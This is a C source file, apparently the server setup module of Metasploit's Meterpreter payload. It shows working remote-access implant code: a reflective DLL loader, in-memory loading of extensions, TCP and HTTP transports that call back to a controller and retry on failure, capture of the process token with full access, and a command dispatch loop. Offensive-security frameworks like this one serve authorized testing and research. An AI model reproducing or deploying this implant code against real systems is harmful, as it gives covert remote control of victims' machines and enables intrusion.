/*!
 * @file server_setup.c
 */
#include "metsrv.h"
#include "../../common/common.h"
#include <ws2tcpip.h>

#include "win/server_transport_winhttp.h"
#include "win/server_transport_tcp.h"

#define TRANSPORT_ID_OFFSET 22

extern Command* extensionCommands;

// include the Reflectiveloader() function
#include "../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
{
	return EXCEPTION_EXECUTE_HANDLER;
}

#define InitAppInstance() { if( hAppInstance == NULL ) hAppInstance = GetModuleHandle( NULL ); }

/*!
 * @brief Get the session id that this meterpreter server is running in.
 * @return ID of the current server session.
 */
DWORD server_sessionid()
{
	typedef BOOL (WINAPI * PROCESSIDTOSESSIONID)( DWORD pid, LPDWORD id );

	static PROCESSIDTOSESSIONID processIdToSessionId = NULL;
	HMODULE kernel	 = NULL;
	DWORD sessionId = 0;

	do
	{
		if (!processIdToSessionId)
		{
			kernel = LoadLibraryA("kernel32.dll");
			if (kernel)
			{
				processIdToSessionId = (PROCESSIDTOSESSIONID)GetProcAddress(kernel, "ProcessIdToSessionId");
			}
		}

		if (!processIdToSessionId)
		{
			break;
		}

		if (!processIdToSessionId(GetCurrentProcessId(), &sessionId))
		{
			sessionId = -1;
		}

	} while( 0 );

	if (kernel)
	{
		FreeLibrary(kernel);
	}

	return sessionId;
}

/*!
 * @brief Load any stageless extensions that might be present in the current payload.
 * @param remote Pointer to the remote instance.
 * @param fd The socket descriptor passed to metsrv during intialisation.
 */
VOID load_stageless_extensions(Remote* remote, MetsrvExtension* stagelessExtensions)
{
	while (stagelessExtensions->size > 0)
	{
		dprintf("[SERVER] Extension located at 0x%p: %u bytes", stagelessExtensions->dll, stagelessExtensions->size);
		HMODULE hLibrary = LoadLibraryR(stagelessExtensions->dll, stagelessExtensions->size);
		initialise_extension(hLibrary, TRUE, remote, NULL, extensionCommands);
		stagelessExtensions = (MetsrvExtension*)((PBYTE)stagelessExtensions->dll + stagelessExtensions->size);
	}

	dprintf("[SERVER] All stageless extensions loaded");
}

static BOOL create_transport(MetsrvTransportCommon* transportCommon, Transport** transport, PDWORD size)
{
	if (wcsncmp(transportCommon->url, L"tcp", 3) == 0)
	{
		*size = sizeof(MetsrvTransportTcp);
		*transport = transport_create_tcp_config((MetsrvTransportTcp*)transportCommon);
	}
	else
	{
		*size = sizeof(MetsrvTransportHttp);
		*transport = transport_create_http_config((MetsrvTransportHttp*)transportCommon);
	}
	return TRUE;
}

static void append_transport(Transport** list, Transport* newTransport)
{
	if (*list == NULL)
	{
		// point to itself!
		newTransport->next_transport = newTransport->prev_transport = newTransport;
		*list = newTransport;
	}
	else
	{
		// always insert at the tail
		newTransport->prev_transport = (*list)->prev_transport;
		newTransport->next_transport = (*list);

		(*list)->prev_transport->next_transport = newTransport;
		(*list)->prev_transport = newTransport;
	}
}

static void remove_transport(Transport** list, Transport* oldTransport)
{
	// if we point to ourself, then we're the last one
	if ((*list)->next_transport == oldTransport)
	{
		*list = NULL;
	}
	else
	{
		*list = oldTransport->next_transport;
		oldTransport->prev_transport->next_transport = oldTransport->next_transport;
		oldTransport->next_transport->prev_transport = oldTransport->prev_transport;
	}

	oldTransport->prev_transport = oldTransport->next_transport = NULL;
}

static BOOL create_transports(Remote* remote, MetsrvTransportCommon* transports, PDWORD parsedSize, Transport** currentTransport)
{
	DWORD totalSize = 0;
	MetsrvTransportCommon* current = transports;

	// The first part of the transport is always the URL, if it's NULL, we are done.
	while (current->url[0] != 0)
	{
		Transport* transport;
		DWORD size;
		if (create_transport(current, &transport, &size))
		{
			totalSize += size;

			// always insert at the tail. The first transport will be the one that kicked everything off
			if (*currentTransport == NULL)
			{
				// point to itself!
				transport->next_transport = transport->prev_transport = transport;
				*currentTransport = transport;
			}
			else
			{
				transport->prev_transport = (*currentTransport)->prev_transport;
				transport->next_transport = (*currentTransport);

				(*currentTransport)->prev_transport->next_transport = transport;
				(*currentTransport)->prev_transport = transport;
			}

			// share the lock with the transport
			transport->lock = remote->lock;

			// go to the next transport based on the size of the existing one.
			current = (MetsrvTransportCommon*)((PBYTE)current + size);
		}
		else
		{
			// This is not good
			return FALSE;
		}
	}

	// account for the last terminating NULL byte
	*parsedSize = totalSize + 1;

	return TRUE;
}

/*!
 * @brief Create a new transport based on the given metsrv configuration.
 * @param config Pointer to the metsrv configuration block.
 * @param stageless Indication of whether the configuration is stageless.
 * @param fd The socket descriptor passed to metsrv during intialisation.
 */
//static Transport* transport_create(MetsrvConfigData* config, BOOL stageless)
//{
//	Transport* t = NULL;
//	wchar_t* transport = config->transport + TRANSPORT_ID_OFFSET;
//	wchar_t* url = config->url + (stageless ? 1 : 0);
//
//	dprintf("[TRANSPORT] Type = %S", transport);
//	dprintf("[TRANSPORT] URL = %S", url);
//
//	if (wcscmp(transport, L"SSL") == 0)
//	{
//		t = transport_create_tcp(url, &config->timeouts.values);
//	}
//	else
//	{
//		BOOL ssl = wcscmp(transport, L"HTTPS") == 0;
//		t = transport_create_http(ssl, url, config->ua, config->proxy, config->proxy_username,
//			config->proxy_password, config->ssl_cert_hash, &config->timeouts.values);
//	}
//
//	dprintf("[TRANSPORT] Comms timeout: %u %08x", t->timeouts.comms, t->timeouts.comms);
//	dprintf("[TRANSPORT] Session timeout: %u %08x", t->timeouts.expiry, t->timeouts.expiry);
//	dprintf("[TRANSPORT] Session expires: %u %08x", t->expiration_end, t->expiration_end);
//	dprintf("[TRANSPORT] Retry total: %u %08x", t->timeouts.retry_total, t->timeouts.retry_total);
//	dprintf("[TRANSPORT] Retry wait: %u %08x", t->timeouts.retry_wait, t->timeouts.retry_wait);
//
//	return t;
//}

/*!
 * @brief Setup and run the server. This is called from Init via the loader.
 * @param fd The original socket descriptor passed in from the stager, or a pointer to stageless extensions.
 * @return Meterpreter exit code (ignored by the caller).
 */
DWORD server_setup(MetsrvConfig* config)
{
	THREAD* serverThread = NULL;
	Remote* remote = NULL;
	char stationName[256] = { 0 };
	char desktopName[256] = { 0 };
	DWORD res = 0;

	dprintf("[SERVER] Initializing...");

	// if hAppInstance is still == NULL it means that we havent been
	// reflectivly loaded so we must patch in the hAppInstance value
	// for use with loading server extensions later.
	InitAppInstance();

	srand((unsigned int)time(NULL));

	__try
	{
		do
		{
			dprintf("[SERVER] module loaded at 0x%08X", hAppInstance);

			// Open a THREAD item for the servers main thread, we use this to manage migration later.
			serverThread = thread_open();

			dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X", serverThread->handle, serverThread->id, serverThread->sigterm);

			if (!(remote = remote_allocate()))
			{
				SetLastError(ERROR_NOT_ENOUGH_MEMORY);
				break;
			}

			remote->sess_expiry_time = config->session.expiry;
			remote->sess_start_time = current_unix_timestamp();
			remote->sess_expiry_end = remote->sess_start_time + config->session.expiry;

			DWORD transportSize = 0;
			if (!create_transports(remote, config->transports, &transportSize, &remote->transport))
			{
				// not good, bail out!
				SetLastError(ERROR_BAD_ARGUMENTS);
				break;
			}

			// the first transport should match the transport that we initially connected on.
			// If it's TCP comms, we need to wire that up.
			if (config->session.comms_fd)
			{
				((TcpTransportContext*)remote->transport->ctx)->fd = config->session.comms_fd;
				((TcpTransportContext*)remote->transport->ctx)->listen = config->session.listen_fd;
			}

			load_stageless_extensions(remote, (MetsrvExtension*)((PBYTE)config->transports + transportSize));

			// Set up the transport creation function pointers.
			//remote->trans_create_tcp = transport_create_tcp;
			//remote->trans_create_http = transport_create_http;

			// Store our thread handle
			remote->server_thread = serverThread->handle;

			// Store our process token
			if (!OpenThreadToken(remote->server_thread, TOKEN_ALL_ACCESS, TRUE, &remote->server_token))
			{
				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &remote->server_token);
			}

			if (scheduler_initialize(remote) != ERROR_SUCCESS)
			{
				SetLastError(ERROR_BAD_ENVIRONMENT);
				break;
			}

			// Copy it to the thread token
			remote->thread_token = remote->server_token;

			// Save the initial session/station/desktop names...
			remote->orig_sess_id = server_sessionid();
			remote->curr_sess_id = remote->orig_sess_id;
			GetUserObjectInformation(GetProcessWindowStation(), UOI_NAME, &stationName, 256, NULL);
			remote->orig_station_name = _strdup(stationName);
			remote->curr_station_name = _strdup(stationName);
			GetUserObjectInformation(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, &desktopName, 256, NULL);
			remote->orig_desktop_name = _strdup(desktopName);
			remote->curr_desktop_name = _strdup(desktopName);

			dprintf("[SERVER] Registering dispatch routines...");
			register_dispatch_routines();

			remote->sess_start_time = current_unix_timestamp();

			// loop through the transports, reconnecting each time.
			while (remote->transport)
			{
				if (remote->transport->transport_init)
				{
					dprintf("[SERVER] attempting to initialise transport 0x%p", remote->transport->transport_init);
					// Each transport has its own set of retry settings and each should honour
					// them individually.
					if (!remote->transport->transport_init(remote->transport))
					{
						dprintf("[SERVER] transport initialisation failed, remove from the list.");
						Transport* transToRemove = remote->transport;
						remove_transport(&remote->transport, transToRemove);
						transToRemove->transport_destroy(transToRemove);

						// when we have a list of transports, we'll iterate to the next one.
						continue;
					}
				}

				dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
				DWORD dispatchResult = remote->transport->server_dispatch(remote, serverThread);

				if (remote->transport->transport_deinit)
				{
					remote->transport->transport_deinit(remote->transport);
				}

				// If the transport mechanism failed, then we should loop until we're able to connect back again.
				if (dispatchResult == ERROR_SUCCESS)
				{
					// But if it was successful, and this is a valid exit, then we should clean up and leave.
					break;
				}
				else
				{
					// try again!
					if (remote->transport->transport_reset)
					{
						remote->transport->transport_reset(remote->transport);
					}

					// move to the next one in the list
					remote->transport = remote->transport->next_transport;
				}
			}

			// clean up the transports
			while (remote->transport)
			{
				Transport* t = remote->transport;
				remove_transport(&remote->transport, t);
				t->transport_destroy(t);
			}

			dprintf("[SERVER] Deregistering dispatch routines...");
			deregister_dispatch_routines(remote);
		} while (0);

		dprintf("[DISPATCH] calling scheduler_destroy...");
		scheduler_destroy();

		dprintf("[DISPATCH] calling command_join_threads...");
		command_join_threads();

		remote_deallocate(remote);
	}
	__except (exceptionfilter(GetExceptionCode(), GetExceptionInformation()))
	{
		dprintf("[SERVER] *** exception triggered!");

		thread_kill(serverThread);
	}

	dprintf("[SERVER] Finished.");
	return res;
}
